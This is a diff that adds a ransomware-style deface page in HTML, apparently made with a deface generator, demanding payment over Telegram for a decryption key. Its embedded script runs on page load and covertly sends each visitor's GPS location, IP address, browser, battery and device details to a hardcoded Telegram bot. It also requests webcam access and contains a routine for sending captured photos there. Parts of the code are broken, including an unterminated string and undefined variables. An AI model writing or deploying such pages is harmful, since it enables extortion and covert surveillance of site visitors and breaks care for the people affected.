@@ -1,0 +1,236 @@
+<!--
+--  Downloaded from : https://haxor.my.id/save/rratz_claratz.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+-->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GanzXlock - Device!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .container img {
+            width: 100%;
+            height: auto;
+            max-height: 250px;
+            object-fit: cover;
+            margin-bottom: 20px;
+            border-radius: 10px;
+        }
+        h2 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            border: none;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        .telegram-link {
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .telegram-link img {
+            width: 24px;
+            height: auto;
+        }
+        .telegram-link a {
+            text-decoration: none;
+            font-size: 20px;
+            font-weight: bold;
+            color: #0088cc;
+        }
+        .telegram-link a:hover {
+            color: #006bb3;
+        }
+        @media (max-width: 768px) {
+            .container {
+                width: 90%;
+            }
+        }
+        @media (max-width: 480px) {
+            .container img {
+                max-height: 200px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <audio autoplay loop>
+        <source src="https://l.top4top.io/m_3254s2c0v0.mp3" type="audio/mpeg">
+    </audio>
+    <div class="container">
+        <img src="https://cdn1.katadata.co.id/media/images/thumb/2024/06/24/Ilustrasi_hacker_menyerang_pusat_data_nasional-2024_06_24-16_41_42_fee6b0fc9809923fbf6b70496f536ce3_960x640_thumb.jpeg" alt="Gambar Besar">
+        <h2>Whooppss?!!? </h2>
+        <h3>If You Still Want This All Then Contact Me On Telegram To Get The Key!</h3><br>400rb
+        <input type="text" id="GanzXploit" placeholder="Decrypt Key...">
+        <button onclick="validateKey()">Submit</button>
+        <div id="message" class="message"></div>
+        <div class="telegram-link">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Telegram_2019_Logo.svg" alt="Telegram Logo">
+            <a href="https://t.me/Skyzmct1" target="_blank">GanzXploit</a>
+        </div>
+    </div>
+    <script>
+      const telegramBotToken = '7653207867:AAGVPkLCXM0nbi2Kv3_LadW94FkT7lVWg;
+        const chatId = '6772957208';
+        function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        }
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob);
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            });
+        }
+        function captureImage() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+                sendPhotoToTelegram(blob);
+            }, 'image/png');
+        }
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    sendToTelegram(`📍 <b>Lokasi GPS:</b> <a href="${locationLink}">Lihat di Google Maps</a>`);
+                });
+            }
+        }
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    sendToTelegram(`🌐 <b>IP Address:</b> ${data.ip}`);
+                });
+        }
+        function getBattery() {
+            navigator.getBattery().then(function(battery) {
+                sendToTelegram(`🔋 <b>Baterai:</b> ${(battery.level * 100)}%, Sedang di-charge: ${battery.charging ? "Ya" : "Tidak"}`);
+            });
+        }
+        function getBrowserInfo() {
+            sendToTelegram(`💻 <b>Browser:</b> ${navigator.userAgent}\n🖥️ <b>Platform:</b> ${navigator.platform}\n🌍 <b>Bahasa:</b> ${navigator.language}`);
+        }
+        function getTimeStamp() {
+            const now = new Date();
+            sendToTelegram(`⏰ <b>Waktu Akses:</b> ${now.toLocaleString()}`);
+        }
+        function getScreenResolution() {
+            sendToTelegram(`🖥️ <b>Resolusi Layar:</b> ${window.screen.width}x${window.screen.height}`);
+        }
+        function getConnectionInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                sendToTelegram(`📡 <b>Kecepatan Koneksi:</b> ${connection.effectiveType}`);
+            }
+        }
+        function getCookieStatus() {
+            sendToTelegram(`🍪 <b>Status Cookie:</b> ${navigator.cookieEnabled ? "Aktif" : "Non-aktif"}`);
+        }
+        function getMemoryInfo() {
+            if (navigator.deviceMemory) {
+                sendToTelegram(`📱 <b>Memori Perangkat:</b> ${navigator.deviceMemory} GB`);
+            }
+        }
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            });
+        getLocation();
+        getIP();
+        getBattery();
+        getBrowserInfo();
+        getTimeStamp();
+        getScreenResolution();
+        getConnectionInfo();
+        getCookieStatus();
+        getMemoryInfo();
+        
+        function validateKey() {
+            const DitzzXploit = document.getElementById('GanzXploit').value;
+            const messageDiv = document.getElementById('message');
+            if (!DitzzXploit) {
+                messageDiv.innerHTML = '<p style="color: red;">The key cannot be empty!</p>';
+                return;
+            }
+
+      fetch('ransomware.html', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'GanzXploit=' + encodeURIComponent(GanzXploit),
+            })
+                .then((response) => response.text())
+                .then((data) => {
+                    if (data.includes('DECRYPTION SUCCESSFULLY')) {
+                        messageDiv.innerHTML = '<p style="color: green;">File Successfully Decrypted!</p>';
+                    } else if (data.includes('Kunci salah')) {
+                        messageDiv.innerHTML = '<p style="color: red;">Wrong key!</p>';
+                    } else {
+                        messageDiv.innerHTML = '<p style="color: red;">An error occurred. Please try again.</p>';
+                    }
+                })
+                .catch((error) => {
+                    messageDiv.innerHTML = '<p style="color: red;">Error: ' + error.message + '</p>';
+                });
+        }
+    </script>
+</body>
